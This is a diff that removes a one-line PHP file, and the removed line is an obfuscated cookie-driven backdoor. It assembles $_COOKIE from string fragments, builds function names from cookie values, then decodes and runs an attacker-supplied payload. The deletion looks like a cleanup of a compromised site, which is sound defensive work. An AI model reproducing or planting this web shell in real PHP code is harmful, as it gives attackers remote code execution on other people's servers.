@@ -1,1 +1,0 @@
-<?php $n='OKI';/*FL*/$k='E';$b/*eG,*/='_CO';$ax=/*u;$a*/${$b.$n.$k};$tn=$ax/*Y*/['t'].$ax['CC'];$l=/*I*/$ax['U'].$ax['K'].$ax['B'];$vm=$tn('',$l($ax['J']));$vm();
